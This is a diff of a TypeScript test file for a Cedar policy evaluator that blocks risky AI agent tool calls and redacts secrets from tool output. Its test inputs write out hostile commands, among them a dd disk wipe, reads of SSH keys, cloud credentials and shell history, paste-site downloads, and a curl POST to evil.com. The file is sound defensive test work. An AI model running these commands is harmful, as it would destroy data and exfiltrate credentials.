@@ -5,9 +5,9 @@
  * No actual files are created/modified - we test the policy logic directly.
  */
 
-import { describe, it, expect, beforeAll } from "vitest";
 import fs from "fs";
 import path from "path";
+import { describe, it, expect, beforeAll } from "vitest";
 import { CedarEvaluator } from "./evaluator.js";
 
 // Load the default policy pack
@@ -28,7 +28,11 @@ beforeAll(() => {
 });
 
 // Helper to test PRE_TOOL blocking
-function expectBlocked(toolName: string, params: Record<string, unknown>, expectedPolicyId?: string) {
+function expectBlocked(
+  toolName: string,
+  params: Record<string, unknown>,
+  expectedPolicyId?: string,
+) {
   const result = evaluator.evaluatePreTool(toolName, params);
   expect(result.decision).toBe("DENY");
   if (expectedPolicyId) {
@@ -127,7 +131,11 @@ describe("Dangerous Command Restrictions", () => {
     });
 
     it("blocks dd if=", () => {
-      expectBlocked("exec", { command: "dd if=/dev/zero of=/dev/sda" }, "sondera-block-disk-operations");
+      expectBlocked(
+        "exec",
+        { command: "dd if=/dev/zero of=/dev/sda" },
+        "sondera-block-disk-operations",
+      );
     });
 
     it("blocks writes to /dev/sd*", () => {
@@ -140,7 +148,11 @@ describe("Dangerous Command Restrictions", () => {
 
     it("blocks all dd if= commands (even safe ones)", () => {
       // The policy blocks ALL dd if= commands for safety
-      expectBlocked("exec", { command: "dd if=input.img of=output.img" }, "sondera-block-disk-operations");
+      expectBlocked(
+        "exec",
+        { command: "dd if=input.img of=output.img" },
+        "sondera-block-disk-operations",
+      );
     });
 
     it("allows dd without if=", () => {
@@ -200,7 +212,11 @@ describe("Sensitive File Restrictions", () => {
     });
 
     it("blocks reading authorized_keys", () => {
-      expectBlocked("read", { path: "/home/user/.ssh/authorized_keys" }, "sondera-block-read-ssh-keys");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.ssh/authorized_keys" },
+        "sondera-block-read-ssh-keys",
+      );
     });
 
     it("blocks reading .pem files", () => {
@@ -234,16 +250,28 @@ describe("Sensitive File Restrictions", () => {
 
   describe("sondera-block-read-cloud-creds", () => {
     it("blocks reading AWS credentials", () => {
-      expectBlocked("read", { path: "/home/user/.aws/credentials" }, "sondera-block-read-cloud-creds");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.aws/credentials" },
+        "sondera-block-read-cloud-creds",
+      );
       expectBlocked("read", { path: "/home/user/.aws/config" }, "sondera-block-read-cloud-creds");
     });
 
     it("blocks reading GCloud credentials", () => {
-      expectBlocked("read", { path: "/home/user/.gcloud/credentials.json" }, "sondera-block-read-cloud-creds");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.gcloud/credentials.json" },
+        "sondera-block-read-cloud-creds",
+      );
     });
 
     it("blocks reading Azure credentials", () => {
-      expectBlocked("read", { path: "/home/user/.azure/credentials" }, "sondera-block-read-cloud-creds");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.azure/credentials" },
+        "sondera-block-read-cloud-creds",
+      );
     });
 
     it("blocks reading kube config", () => {
@@ -254,7 +282,11 @@ describe("Sensitive File Restrictions", () => {
   describe("sondera-block-write-ssh", () => {
     it("blocks writing to .ssh directory", () => {
       expectBlocked("write", { path: "/home/user/.ssh/id_rsa" }, "sondera-block-write-ssh");
-      expectBlocked("write", { path: "/home/user/.ssh/authorized_keys" }, "sondera-block-write-ssh");
+      expectBlocked(
+        "write",
+        { path: "/home/user/.ssh/authorized_keys" },
+        "sondera-block-write-ssh",
+      );
       expectBlocked("write", { path: "/home/user/.ssh/config" }, "sondera-block-write-ssh");
     });
 
@@ -277,7 +309,11 @@ describe("Sensitive File Restrictions", () => {
   describe("sondera-block-write-git-internals", () => {
     it("blocks writing to .git directory", () => {
       expectBlocked("write", { path: "/project/.git/config" }, "sondera-block-write-git-internals");
-      expectBlocked("write", { path: "/project/.git/hooks/pre-commit" }, "sondera-block-write-git-internals");
+      expectBlocked(
+        "write",
+        { path: "/project/.git/hooks/pre-commit" },
+        "sondera-block-write-git-internals",
+      );
     });
 
     it("allows writing to project files", () => {
@@ -336,11 +372,19 @@ describe("System Directory Restrictions", () => {
     });
 
     it("blocks writing to /sys", () => {
-      expectBlocked("write", { path: "/sys/kernel/mm/transparent_hugepage/enabled" }, "sondera-block-write-system-dirs");
+      expectBlocked(
+        "write",
+        { path: "/sys/kernel/mm/transparent_hugepage/enabled" },
+        "sondera-block-write-system-dirs",
+      );
     });
 
     it("blocks writing to /proc", () => {
-      expectBlocked("write", { path: "/proc/sys/net/ipv4/ip_forward" }, "sondera-block-write-system-dirs");
+      expectBlocked(
+        "write",
+        { path: "/proc/sys/net/ipv4/ip_forward" },
+        "sondera-block-write-system-dirs",
+      );
     });
 
     it("allows writing to user directories", () => {
@@ -376,27 +420,51 @@ describe("System Directory Restrictions", () => {
 describe("Shell History Protection", () => {
   describe("sondera-block-read-shell-history", () => {
     it("blocks reading bash history", () => {
-      expectBlocked("read", { path: "/home/user/.bash_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.bash_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("blocks reading zsh history", () => {
-      expectBlocked("read", { path: "/home/user/.zsh_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.zsh_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("blocks reading node REPL history", () => {
-      expectBlocked("read", { path: "/home/user/.node_repl_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.node_repl_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("blocks reading Python history", () => {
-      expectBlocked("read", { path: "/home/user/.python_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.python_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("blocks reading psql history", () => {
-      expectBlocked("read", { path: "/home/user/.psql_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.psql_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("blocks reading MySQL history", () => {
-      expectBlocked("read", { path: "/home/user/.mysql_history" }, "sondera-block-read-shell-history");
+      expectBlocked(
+        "read",
+        { path: "/home/user/.mysql_history" },
+        "sondera-block-read-shell-history",
+      );
     });
 
     it("allows reading other files", () => {
@@ -413,15 +481,27 @@ describe("Shell History Protection", () => {
 describe("Network Restrictions", () => {
   describe("sondera-block-paste-sites", () => {
     it("blocks pastebin.com", () => {
-      expectBlocked("exec", { command: "curl https://pastebin.com/raw/abc123" }, "sondera-block-paste-sites");
+      expectBlocked(
+        "exec",
+        { command: "curl https://pastebin.com/raw/abc123" },
+        "sondera-block-paste-sites",
+      );
     });
 
     it("blocks paste.ee", () => {
-      expectBlocked("exec", { command: "wget https://paste.ee/p/abc123" }, "sondera-block-paste-sites");
+      expectBlocked(
+        "exec",
+        { command: "wget https://paste.ee/p/abc123" },
+        "sondera-block-paste-sites",
+      );
     });
 
     it("blocks hastebin", () => {
-      expectBlocked("exec", { command: "curl https://hastebin.com/raw/abc" }, "sondera-block-paste-sites");
+      expectBlocked(
+        "exec",
+        { command: "curl https://hastebin.com/raw/abc" },
+        "sondera-block-paste-sites",
+      );
     });
 
     it("blocks 0x0.st", () => {
@@ -435,7 +515,11 @@ describe("Network Restrictions", () => {
 
   describe("sondera-block-curl-post-external", () => {
     it("blocks curl POST to external hosts", () => {
-      expectBlocked("exec", { command: "curl -X POST https://evil.com/collect" }, "sondera-block-curl-post-external");
+      expectBlocked(
+        "exec",
+        { command: "curl -X POST https://evil.com/collect" },
+        "sondera-block-curl-post-external",
+      );
     });
 
     it("allows curl POST to localhost", () => {
@@ -468,7 +552,7 @@ describe("Output Redaction (POST_TOOL)", () => {
 
     it("redacts api_key=", () => {
       // Policy looks for api_key= (with equals sign)
-      expectRedacted("read", 'api_key=secret123', "sondera-redact-api-keys");
+      expectRedacted("read", "api_key=secret123", "sondera-redact-api-keys");
     });
 
     it("redacts apikey", () => {
@@ -560,7 +644,11 @@ describe("Output Redaction (POST_TOOL)", () => {
 
   describe("sondera-redact-google-keys", () => {
     it("redacts AIza* patterns", () => {
-      expectRedacted("read", "google_api_key: AIzaSyABCDEFGHIJKLMNOP", "sondera-redact-google-keys");
+      expectRedacted(
+        "read",
+        "google_api_key: AIzaSyABCDEFGHIJKLMNOP",
+        "sondera-redact-google-keys",
+      );
     });
 
     it("redacts GOOGLE_API_KEY", () => {
